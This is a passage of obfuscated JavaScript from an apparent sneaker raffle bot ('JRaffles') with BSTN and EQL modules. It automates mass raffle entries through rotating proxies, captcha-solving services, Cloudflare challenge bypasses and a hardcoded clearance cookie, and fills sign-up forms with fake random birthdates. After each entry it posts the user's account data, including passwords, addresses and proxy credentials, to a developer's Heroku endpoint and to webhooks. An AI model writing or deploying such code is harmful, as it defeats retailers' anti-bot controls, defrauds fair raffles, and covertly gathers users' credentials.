                            return _0x28f79a;
                        }
                        if (await _0x2df093(_0x15ad75[_0x26aed4]) == !![]) {
                            console['log'](_0x11b348() + '\x20[' + _0x369990['name'] + ']\x20Task\x20' + (_0x26aed4 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                            continue;
                        }
                        if (_0x541c5f != 'yes')
                            var _0x541c5f = '', _0x158d81 = 0x0;
                        _0x3e0125(_0x369990['name'] + '\x20Task\x20' + (_0x26aed4 + 0x1) + '\x20/\x20' + _0x15ad75['length'] + '\x20||\x20File:\x20' + _0x5d3bce + '\x20Proxies:\x20' + _0x2ffd47);
                        var _0x3c0207 = Math['round'](Math['random']() * (_0x33e1b2['length'] - 0x1)), _0x6eb70b = _0x33e1b2[_0x3c0207]['split'](':'), _0x2d6113;
                        try {
                            _0x2d6113 = await _0x181ece['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x6eb70b[0x0] + ':' + _0x6eb70b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2d6113 = await _0x181ece['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x6eb70b[0x0] + ':' + _0x6eb70b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3a79e0 = await _0x2d6113['newPage'](), _0x4eab11 = await _0x3a79e0['target']()['createCDPSession'](), { windowId: _0x5a4212 } = await _0x4eab11['send']('Browser.getWindowForTarget');
                            await _0x3a79e0['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x78ab6f = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x3a79e0['authenticate']({
                                'username': '' + _0x6eb70b[0x2],
                                'password': '' + _0x6eb70b[0x3]
                            }), console['log'](_0x11b348() + '\x20[' + _0x369990['name'] + ']\x20Task\x20' + (_0x26aed4 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3a79e0['goto']('' + _0x15ad75[_0x26aed4]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x11b348() + '\x20[' + _0x369990['name'] + ']\x20Task\x20' + (_0x26aed4 + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            var _0x1689c6 = await _0x3a79e0['$']('.hcaptcha-box');
                            if (_0x1689c6) {
                                console['log'](_0x11b348() + '\x20[' + _0x369990['name'] + ']\x20Task\x20' + (_0x26aed4 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0xaebb71(0x2710);
                                const _0x1ad89 = await _0x3a79e0['$']('.hcaptcha-box');
                                if (_0x1ad89)
                                    try {
                                        await _0x1ad89['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x3a79e0['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x4743ad = await _0x3a79e0['$']('.hcaptcha-box');
                                    if (_0x4743ad)
                                        try {
                                            await _0x4743ad['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0x3a79e0['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                            } catch {
                                throw new Error('Blocked\x20by\x20Cloudflare');
                            }
                            await _0x4eab11['send']('Browser.setWindowBounds', {
                                'windowId': _0x5a4212,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0xaebb71(0x1388), await _0x3a79e0['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x3a79e0['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0xaebb71(0x1f4), console['log'](_0x11b348() + '\x20[' + _0x369990['name'] + ']\x20Task\x20' + (_0x26aed4 + 0x1) + '\x20:\x20Logging\x20in'), await _0x3a79e0['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x1293b5 => _0x1293b5['click']()), await _0x3a79e0['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x3a79e0['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0xaebb71(0x7d0), await _0x3a79e0['waitForSelector']('#email-login'), await _0x3a79e0['type']('#email-login', '' + _0x15ad75[_0x26aed4]['Email']), await _0xaebb71(0xdac), await _0x3a79e0['waitForSelector']('#password'), await _0x3a79e0['type']('#password', '' + _0x15ad75[_0x26aed4]['Password'], { 'delay': 0xe6 }), await _0xaebb71(0x157c);
                            try {
                                await _0x3a79e0['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x47ef0b => _0x47ef0b['click']());
                            } catch {
                            }
                            try {
                                await _0x3a79e0['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0x1ee7ae) {
                            }
                            await _0xaebb71(0x3e8);
                            const _0x4349bd = await _0x3a79e0['$']('.enteredDraw_container__2KmQ_');
                            if (_0x4349bd)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0x11b348() + '\x20[' + _0x369990['name'] + ']\x20Task\x20' + (_0x26aed4 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x15ad75[_0x26aed4]['Size']);
                            try {
                                if (_0x15ad75[_0x26aed4]['Size'] != 'RANDOM') {
                                    var _0x290250 = _0x15ad75[_0x26aed4]['Size']['replace']('.', ',');
                                    const _0x18d0c9 = await _0x3a79e0['$x']('//div[contains(text(),\x20\x27' + _0x290250 + '\x27)]');
                                    await _0x18d0c9[0x0]['click']();
                                } else {
                                    const _0x276fb5 = await _0x3a79e0['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x1c5a58 = Math['round'](Math['random']() * (_0x276fb5['length'] - 0x1));
                                    await _0x276fb5[_0x1c5a58]['click']();
                                }
                            } catch (_0x30a152) {
                                throw new Error('Softblocked,\x20Rotating\x20proxy');
                            }
                            await _0xaebb71(0x1f4);
                            const _0x875191 = await _0x3a79e0['$']('.addressList_addressItem__LE2PB');
                            if (_0x875191 && _0x15ad75[_0x26aed4]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0x11b348() + '\x20[' + _0x369990['name'] + ']\x20Task\x20' + (_0x26aed4 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x3a79e0['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0xaebb71(0x5dc), await _0x3a79e0['waitForSelector']('#firstname'), await _0x3a79e0['type']('#firstname', '' + _0x15ad75[_0x26aed4]['FirstName']), await _0xaebb71(0x1f4), await _0x3a79e0['waitForSelector']('#firstname'), await _0x3a79e0['type']('#lastname', '' + _0x15ad75[_0x26aed4]['LastName']), await _0xaebb71(0x1f4), await _0x3a79e0['waitForSelector']('#firstname'), await _0x3a79e0['type']('#street', '' + _0x15ad75[_0x26aed4]['Address1']), await _0xaebb71(0x1f4), await _0x3a79e0['waitForSelector']('#firstname'), await _0x3a79e0['type']('#houseNumber', _0x15ad75[_0x26aed4]['HouseNumber'] + '\x20' + _0x15ad75[_0x26aed4]['Address2']), await _0xaebb71(0x1f4), await _0x3a79e0['waitForSelector']('#firstname'), await _0x3a79e0['select']('#country_code', '' + _0x15ad75[_0x26aed4]['Country']), await _0xaebb71(0x1f4), await _0x3a79e0['type']('#postcode', '' + _0x15ad75[_0x26aed4]['Zip']), await _0xaebb71(0x1f4), await _0x3a79e0['type']('#city', '' + _0x15ad75[_0x26aed4]['City']), await _0xaebb71(0x1f4), await _0x3a79e0['type']('#telephone', '' + _0x15ad75[_0x26aed4]['Phone']), await _0xaebb71(0x1f4), await _0x3a79e0['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0xaebb71(0x9c4);
                            try {
                                await _0x3a79e0['type']('#instagram_name', '' + _0x15ad75[_0x26aed4]['Follower']), await _0x3a79e0['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0x11b348() + '\x20[' + _0x369990['name'] + ']\x20Task\x20' + (_0x26aed4 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0xaebb71(0x5dc);
                            try {
                                await _0x3a79e0['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0xaebb71(0x5dc), await _0x3a79e0['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x361a16 => _0x361a16['click']()), await _0xaebb71(0x1388);
                            try {
                                await _0x3a79e0['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x3a79e0['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0x15ad75[_0x26aed4]['Size'] != 'RANDOM') {
                                    var _0x290250 = _0x15ad75[_0x26aed4]['Size']['replace']('.', ',');
                                    const _0x7cf4a = await _0x3a79e0['$x']('//div[contains(text(),\x20' + _0x290250 + ')]');
                                    await _0x7cf4a[0x0]['click']();
                                } else {
                                    const _0x88551a = await _0x3a79e0['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x1c5a58 = Math['round'](Math['random']() * (_0x88551a['length'] - 0x1));
                                    await _0x88551a[_0x1c5a58]['click']();
                                }
                                await _0xaebb71(0x5dc);
                                try {
                                    await _0x3a79e0['hover']('#instagram_name'), await _0x3a79e0['type']('#instagram_name', '' + _0x15ad75[_0x26aed4]['Follower']), await _0x3a79e0['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x11b348() + '\x20[' + _0x369990['name'] + ']\x20Task\x20' + (_0x26aed4 + 0x1) + '\x20:\x20Retrying\x20(' + _0x158d81 + '\x20/\x205)');
                                try {
                                    await _0x3a79e0['hover']('.checkBox_boxHolder__wLGVe'), await _0xaebb71(0x5dc), await _0x3a79e0['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0xaebb71(0x157c), await _0x3a79e0['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x1c7743 => _0x1c7743['click']()), await _0xaebb71(0x1388), await _0x3a79e0['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x541c5f = 'no', _0x20f501(_0x15ad75[_0x26aed4], _0x369990);
                            try {
                                prxdata = {
                                    'username': _0x3f93ac['replace']('#', ''),
                                    'entrydata': JSON['stringify'](_0x14abc3),
                                    'proxy': '' + _0x33e1b2[_0x26aed4]
                                };
                                var _0xbe6b07 = JSON['stringify'](prxdata);
                                let _0x265778 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x52d98a['post']('https://jraffles.herokuapp.com/success', _0xbe6b07, _0x265778);
                            } catch (_0x1cb04d) {
                            }
                            console['log'](_0x218a39['green'](_0x11b348() + '\x20[' + _0x369990['name'] + ']\x20Task\x20' + (_0x26aed4 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0x4037a7 = await _0x3ead77(_0x15ad75[_0x26aed4], _0x369990, 'dev', ![]), _0x3cb97d = await _0x3ead77(_0x15ad75[_0x26aed4], _0x369990, 'pub', ![]);
                            const _0x14714c = {
                                'succesDEVMSG': { 'embeds': [_0x4037a7] },
                                'succesPUBMSG': { 'embeds': [_0x3cb97d] }
                            };
                            let _0x14abc3 = _0x15ad75[_0x26aed4];
                            try {
                                prxdata = {
                                    'username': _0x3f93ac['replace']('#', ''),
                                    'module': _0x369990['name'],
                                    'entrydata': JSON['stringify'](_0x14abc3),
                                    'proxy': '' + _0x33e1b2[_0x26aed4]
                                };
                                var _0xbe6b07 = JSON['stringify'](prxdata);
                                let _0x39ffac = { 'headers': { 'content-type': 'application/json' } };
                                await _0x52d98a['post']('https://jraffles.herokuapp.com/success', _0xbe6b07, _0x39ffac);
                            } catch (_0x1d49d8) {
                            }
                            try {
                                _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x14714c['succesDEVMSG']), await _0xaebb71(0xc8), await _0x4401f2(_0x1f75ad, _0x14714c['succesDEVMSG']), await _0xaebb71(0xc8), await _0x4401f2(_0x2aae93, _0x14714c['succesPUBMSG']);
                            } catch (_0x401aa5) {
                                console['log'](_0x218a39['yellow'](_0x11b348() + '\x20[' + _0x369990['name'] + ']\x20Task\x20' + (_0x26aed4 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x401aa5));
                            }
                        } catch (_0x19ea78) {
                            console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x369990['name'] + ']\x20Task\x20' + (_0x26aed4 + 0x1) + '\x20:\x20' + _0x19ea78)), _0x541c5f = 'yes', _0x27c439 = '' + _0x19ea78;
                            var _0x3df228 = await _0x3ead77(_0x15ad75[_0x26aed4], _0x369990, 'dev', !![], _0x27c439), _0x4037a7 = await _0x3ead77(_0x15ad75[_0x26aed4], _0x369990, 'dev', ![]), _0x3cb97d = await _0x3ead77(_0x15ad75[_0x26aed4], _0x369990, 'pub', ![]);
                            const _0x57245c = {
                                'succesDEVMSG': { 'embeds': [_0x4037a7] },
                                'succesPUBMSG': { 'embeds': [_0x3cb97d] }
                            };
                            _0x57245c['errorDEV'] = { 'embeds': [_0x3df228] }, _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x57245c['errorDEV']), await _0x4401f2(_0x2631ac, _0x57245c['errorDEV']);
                        } finally {
                            _0x2d6113['close']();
                            if (_0x541c5f == 'yes' && _0x158d81 != 0x5) {
                                console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x369990['name'] + ']\x20Task\x20' + (_0x26aed4 + 0x1) + '\x20:\x20Retrying\x20(' + _0x158d81 + '\x20/\x205)')), _0x26aed4 = _0x26aed4 - 0x1, _0x158d81 = _0x158d81 + 0x1;
                                continue;
                            }
                            _0x541c5f == 'yes' && _0x158d81 >= 0x5 && (_0x47d653(_0x15ad75[_0x26aed4], _0x369990), _0x541c5f = 'no', _0x158d81 = 0x0), console['log'](_0x11b348() + '\x20[' + _0x369990['name'] + ']\x20Waiting\x20for\x20' + _0x579cef['delay'] + '\x20ms'), await _0xaebb71(_0x579cef['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x4d89de, _0x3e6ef1) {
                    _0x181ece['use'](_0x26fa28()), _0x181ece['use'](_0x2dba44({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x579cef['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    var _0xac021a;
                    try {
                        const _0x1fc2b2 = _0x4a3ff4['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0xac021a = _0x566459['parse'](_0x1fc2b2, { 'header': !![] })['data'];
                    } catch (_0x2ec32c) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x2c6949 = 0x0; _0x2c6949 < _0xac021a['length']; _0x2c6949++) {
                        if (_0x5c8385 != 'yes')
                            var _0x5c8385 = '', _0x23d27e = 0x0;
                        var _0x3ddf37;
                        _0x3e0125(_0x4d89de['name'] + '\x20Task\x20' + (_0x2c6949 + 0x1) + '\x20/\x20' + _0xac021a['length'] + '\x20||\x20File:\x20' + _0x5d3bce + '\x20Proxies:\x20' + _0x2ffd47);
                        var _0x4ad68d = await _0x3ead77(_0xac021a[_0x2c6949], _0x4d89de, 'acc', ![]);
                        const _0x55838f = { 'succesDEVMSG': { 'embeds': [_0x4ad68d] } }, _0x34c4d0 = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x413882 = Math['round'](Math['random']() * (_0x3e6ef1['length'] - 0x1)), _0x1144be = _0x3e6ef1[_0x413882]['split'](':'), _0x557ce2;
                        try {
                            _0x557ce2 = await _0x181ece['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1144be[0x0] + ':' + _0x1144be[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x557ce2 = await _0x181ece['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1144be[0x0] + ':' + _0x1144be[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xe29ce2 = await _0x557ce2['newPage']();
                            await _0xe29ce2['authenticate']({
                                'username': '' + _0x1144be[0x2],
                                'password': '' + _0x1144be[0x3]
                            }), console['log'](_0x11b348() + '\x20[' + _0x4d89de['name'] + ']\x20Task\x20' + (_0x2c6949 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xe29ce2['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0xe29ce2['setRequestInterception'](!![]), _0xe29ce2['on']('request', _0x55f177 => {
                                _0x55f177['resourceType']() === 'image' ? _0x55f177['abort']() : _0x55f177['continue']();
                            });
                            try {
                                await _0xe29ce2['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0xe29ce2['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0x5c8385 = 'yes';
                                throw new Error('Connection\x20Error');
                            }
                            await _0xe29ce2['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x11b348() + '\x20[' + _0x4d89de['name'] + ']\x20Task\x20' + (_0x2c6949 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0xaebb71(0x3e8), await _0xe29ce2['type']('#email', _0xac021a[_0x2c6949]['Email']), await _0xaebb71(0x1f4), await _0xe29ce2['type']('#pass', _0xac021a[_0x2c6949]['Password']), await _0xaebb71(0x1f4), await _0xe29ce2['$eval']('#login-form', _0x2acd2b => _0x2acd2b['submit']());
                            try {
                                await _0xe29ce2['waitForSelector']('.product-items');
                            } catch {
                                console['log'](_0x11b348() + '\x20[' + _0x4d89de['name'] + ']\x20Task\x20' + (_0x2c6949 + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                continue;
                            }
                            await _0xaebb71(0x190);
                            const _0x2f5781 = await _0xe29ce2['evaluate'](() => {
                                const _0x3555c2 = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                return _0x3555c2['map'](_0x5d5b24 => _0x5d5b24['alt']);
                            }), _0x3268ae = await _0xe29ce2['evaluate'](() => {
                                const _0x3810e4 = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                return _0x3810e4['map'](_0x28e61d => _0x28e61d['innerHTML']);
                            }), _0x43f2d5 = await _0xe29ce2['$$']('.raffle-winner');
                            if (_0x43f2d5['length'] < 0x1) {
                                console['log'](_0x11b348() + '\x20[' + _0x4d89de['name'] + ']\x20Task\x20' + (_0x2c6949 + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x5c8385 = 'no';
                                continue;
                            }
                            console['log'](_0x11b348() + '\x20[' + _0x4d89de['name'] + ']\x20Task\x20' + (_0x2c6949 + 0x1) + '\x20:\x20' + _0x43f2d5['length'] + '\x20Wins\x20Found!');
                            for (var _0x4d3620 = 0x0; _0x4d3620 < _0x43f2d5['length']; _0x4d3620++) {
                                console['log'](_0x218a39['green'](_0x2f5781[_0x4d3620] + _0x3268ae[_0x4d3620]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                            }
                        } catch (_0x3b9115) {
                            console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x4d89de['name'] + ']\x20Task\x20' + (_0x2c6949 + 0x1) + '\x20:\x20' + _0x3b9115)), _0x3ddf37 = '' + _0x3b9115;
                            var _0x5c3346 = await _0x3ead77(_0xac021a[_0x2c6949], _0x4d89de, 'acc', !![], _0x3ddf37);
                            _0x55838f['errorDEV'] = { 'embeds': [_0x5c3346] }, _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x55838f['errorDEV']), await _0x4401f2(_0x2631ac, _0x55838f['errorDEV']), _0x5c8385 = 'yes';
                        } finally {
                            if (_0x557ce2)
                                _0x557ce2['close']();
                            if (_0x5c8385 == 'yes' && _0x23d27e != 0x5) {
                                console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x4d89de['name'] + ']\x20Task\x20' + (_0x2c6949 + 0x1) + '\x20:\x20Retrying\x20(' + _0x23d27e + '\x20/\x205)')), _0x2c6949 = _0x2c6949 - 0x1, _0x23d27e = _0x23d27e + 0x1;
                                continue;
                            }
                            _0x5c8385 == 'yes' && _0x23d27e >= 0x5 && (_0x47d653(_0xac021a[_0x2c6949], _0x4d89de), _0x5c8385 = 'no', _0x23d27e = 0x0), console['log'](_0x11b348() + '\x20[' + _0x4d89de['name'] + ']\x20Waiting\x20for\x20' + _0x579cef['delay'] + '\x20ms'), await _0xaebb71(_0x579cef['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x55a4c9, _0x4da6ed, _0x5c6fc4) {
                _0x181ece['use'](_0x26fa28()), _0x181ece['use'](_0x2dba44({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x579cef['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x32ffd8 = 0x0; _0x32ffd8 < _0x4da6ed['length']; _0x32ffd8++) {
                    var _0x505ce2;
                    _0x3e0125(_0x55a4c9['name'] + '\x20Task\x20' + (_0x32ffd8 + 0x1) + '\x20/\x20' + _0x4da6ed['length'] + '\x20||\x20File:\x20' + _0x5d3bce + '\x20Proxies:\x20' + _0x2ffd47);
                    try {
                        await _0x48a0b3(_0x4da6ed, _0x32ffd8);
                    } catch {
                        _0x1e1eb9 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x10aa28(_0x482fb4) {
                        const _0x24fd49 = _0x4a3ff4['readFileSync']('../successful-tasks.csv', 'utf8'), _0x1949be = _0x566459['parse'](_0x24fd49, { 'header': !![] })['data'];
                        let _0x25fa27 = ![];
                        for (var _0x24eb26 of _0x1949be) {
                            if (_0x24eb26['Url'] == _0x482fb4['Url'] && _0x24eb26['Email'] == _0x482fb4['Email']) {
                                _0x25fa27 = !![];
                                break;
                            }
                        }
                        return _0x25fa27;
                    }
                    if (await _0x10aa28(_0x4da6ed[_0x32ffd8]) == !![]) {
                        console['log'](_0x11b348() + '\x20[' + _0x55a4c9['name'] + ']\x20Task\x20' + (_0x32ffd8 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0xbef803 = ![];
                    const _0x54aa91 = _0x4a3ff4['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x24c876 = _0x566459['parse'](_0x54aa91, { 'header': !![] })['data'];
                    for (var _0x2740e9 of _0x24c876) {
                        _0x2740e9['Email'] == _0x4da6ed[_0x32ffd8]['Email'] && (_0xbef803 = !![]);
                    }
                    if (_0xbef803 == ![]) {
                        var _0x2a1993;
                        if (_0x4da6ed[_0x32ffd8]['Url']['endsWith']('/')) {
                            _0x2a1993 = _0x4da6ed[_0x32ffd8]['Url'] + 'register';
                            if (_0x1e1eb9 != 'yes')
                                var _0x1e1eb9 = '', _0x57033d = 0x0;
                        } else {
                            _0x2a1993 = _0x4da6ed[_0x32ffd8]['Url'] + '/register';
                            if (_0x1e1eb9 != 'yes')
                                var _0x1e1eb9 = '', _0x57033d = 0x0;
                        }
                        if (_0x4da6ed[_0x32ffd8]['Email'] == '' || _0x4da6ed[_0x32ffd8]['FirstName'] == '' || _0x4da6ed[_0x32ffd8]['LastName'] == '') {
                            console['log'](_0x11b348() + '\x20[' + _0x55a4c9['name'] + ']\x20Task\x20' + (_0x32ffd8 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x4da6ed[_0x32ffd8]['Password'] == '' && (_0x4da6ed[_0x32ffd8]['Password'] = 'JRaffles23!');
                        if (_0x579cef['useRandomProxy'] = ![])
                            var _0x2641a2 = _0x5c6fc4[_0x32ffd8]['split'](':');
                        else
                            var _0xe4a13e = Math['round'](Math['random']() * (_0x5c6fc4['length'] - 0x1)), _0x2641a2 = _0x5c6fc4[_0xe4a13e]['split'](':');
                        var _0x22ee85;
                        try {
                            _0x22ee85 = await _0x181ece['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2641a2[0x0] + ':' + _0x2641a2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x22ee85 = await _0x181ece['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2641a2[0x0] + ':' + _0x2641a2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x36c4e8 = await _0x22ee85['newPage']();
                            await _0x36c4e8['authenticate']({
                                'username': '' + _0x2641a2[0x2],
                                'password': '' + _0x2641a2[0x3]
                            }), console['log'](_0x11b348() + '\x20[' + _0x55a4c9['name'] + ']\x20Task\x20' + (_0x32ffd8 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x36c4e8['setRequestInterception'](!![]), _0x36c4e8['on']('request', _0x3ce702 => {
                                _0x3ce702['resourceType']() === 'image' || _0x3ce702['resourceType']() === 'font' || _0x3ce702['resourceType']() === 'media' ? _0x3ce702['abort']() : _0x3ce702['continue']();
                            });
                            try {
                                await _0x36c4e8['goto']('' + _0x2a1993);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x11b348() + '\x20[' + _0x55a4c9['name'] + ']\x20Task\x20' + (_0x32ffd8 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0xaebb71(0x3e8), await _0x36c4e8['waitForSelector']('#email'), await _0x36c4e8['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0xaebb71(0x3e8);
                            try {
                                _0x4da6ed[_0x32ffd8]['Url']['includes']('en-GB') ? await _0x36c4e8['click']('li[data-value=\x22UK\x20' + _0x4da6ed[_0x32ffd8]['Size'] + '\x20/\x20US\x20' + (Number(_0x4da6ed[_0x32ffd8]['Size']) + 0x1) + '\x22]') : await _0x36c4e8['click']('li[data-value=\x22EU\x20' + _0x4da6ed[_0x32ffd8]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x4da6ed[_0x32ffd8]['Size']);
                            }
                            await _0xaebb71(0x6a4), await _0x36c4e8['type']('#email', '' + _0x4da6ed[_0x32ffd8]['Email']), await _0xaebb71(0x352), await _0x36c4e8['waitForSelector']('#password'), await _0x36c4e8['type']('#password', '' + _0x4da6ed[_0x32ffd8]['Password']), await _0xaebb71(0x352), await _0x36c4e8['type']('#phone', '' + _0x4da6ed[_0x32ffd8]['Phone']), await _0xaebb71(0x352);
                            const _0x344fef = await _0x36c4e8['$']('#title\x20>\x20label');
                            await _0xaebb71(0x12c);
                            _0x344fef && await _0x344fef['click']();
                            await _0x36c4e8['type']('#firstName', '' + _0x4da6ed[_0x32ffd8]['FirstName']), await _0xaebb71(0x352), await _0x36c4e8['type']('#lastName', '' + _0x4da6ed[_0x32ffd8]['LastName']), await _0xaebb71(0x352);
                            _0x4da6ed[_0x32ffd8]['Url']['includes']('footlocker.de') ? await _0x36c4e8['type']('#birthdate', _0x8794b(0xa, 0x1c) + '.' + _0x8794b(0xa, 0xc) + '.' + _0x8794b(0x7c6, 0x7d3)) : await _0x36c4e8['type']('#birthdate', _0x8794b(0xa, 0x1c) + '-' + _0x8794b(0xa, 0xc) + '-' + _0x8794b(0x7c6, 0x7d3));
                            await _0xaebb71(0x352), await _0x36c4e8['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                await _0x36c4e8['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
